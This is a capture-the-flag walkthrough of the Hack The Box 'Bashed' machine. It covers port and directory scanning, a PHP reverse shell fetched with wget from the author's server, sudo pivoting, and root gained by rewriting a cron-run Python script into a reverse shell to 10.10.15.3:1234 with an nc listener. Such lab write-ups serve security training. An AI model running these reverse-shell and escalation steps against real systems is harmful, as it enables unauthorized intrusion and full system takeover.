***Description***: Bashed is an easy Linux machine focused on web fuzzing and locating exposed development files. After discovering a functional phpbash instance, access is gained as `www-data` and escalated to `scriptmanager` through sudo permissions. As direct crontab access is restricted, root escalation relies on identifying writable scripts executed by a root-owned scheduled task.

***Used Tools***:
- Nmap
- ffuf
- nc
- BurpSuite

***Enumeration/ Port Scanning***:

After receiving the IP address, I ran a port scan using nmap. That's useful for detecting open ports.

1. nmap -sS -T4 machine_ip
   1.1 -sS tells nmap to use just a TCP SYN scan, instead of completing the full three-way-handshake (that's quieter and faster)
   1.2 -T4 is just a speed indicator to nmap (T1-T5)
   1.3 Response: 80/tcp open http

2. nmap -sV -p 80 machine_ip
   2.1 -sV tells nmap to complete the three-way-handshake and, after that, detect the software version that is being used
   2.2 -p is to indicate the port
   2.3 Response: 80/tcp open http Apache httpd 2.4.18 (Ubuntu) -> this version has a lot of CVEs

Apparently the machine has just a web application. I ran a directory enumeration using ffuf, to detect the web app directories.

3. ffuf -u http://10.129.51.235/FUZZ/ -w /usr/share/wordlists/Web-content/raft-large-dir.txt
   3.1 -u is to indicate the URL
   3.2 -w is to indicate the wordlist
   3.3 Response: uploads [Status: 200] - dev [Status: 200] - php [Status: 200]

***Exploitation***

Exploring the /dev/ directory, I found a php bash in /dev/phpbash.php (www-data@bashed:/var/www/html/dev#). After that, to establish a reverse shell, I used the php revshell from PentestMonkey.

1. python3 -m http.server 8081 (on my machine)
   1.1 That's to spin up an http server so the target machine can download the phprevshell.php
2. wget http://my_machine_ip:8081/phprevshell.php (this has to be executed on /uploads, because that's the only directory www-data can write to)
3. GET /uploads/phprevshell.php to execute the php script

With that, I got a reverse shell ($ id uid=33(www-data) gid=33(www-data) groups=33(www-data)). To upgrade the shell I used python3 -c 'import pty; pty.spawn("/bin/bash")'

![shell as www-data](HTB-photos/2026-09-03_12-19.png)

Running sudo -l (to list the commands the current user, www-data, is permitted to run)

![sudo -l output](HTB-photos/2026-09-03_13-04.png)

That reveals that the www-data user can run any command as scriptmanager. So after that, I went to arrexel's home, and I found user.txt

![user.txt in arrexel's home](HTB-photos/2026-09-03_13-09.png)

Thereafter, listing the directories in the root filesystem, I found a directory /scripts that can be accessed by scriptmanager. To change to the scriptmanager user I used sudo -u scriptmanager -i bash.

![/scripts directory listing](HTB-photos/2026-09-03_15-32.png)

Looking at the information of the files in the directory shows that test.py appears to be executed every minute by root. That can be assumed because the script test.py writes to test.txt (only root can write to it, so test.py has to be executed by root) and by the timestamp. So what I did was modify that script:

4. echo 'import socket,subprocess,os
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(("10.10.15.3",1234));
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(["/bin/sh","-i"])'
   4.1 This script opens a socket connection to my address using the socket lib, and calls /bin/sh (basically to obtain a reverse shell as root)

5. nc -lnvp 1234 (on my machine)
   5.1 I used netcat to open a listener on port 1234, waiting to receive the socket connection.

![root shell caught via cron job](HTB-photos/2026-09-03_16-05.png)
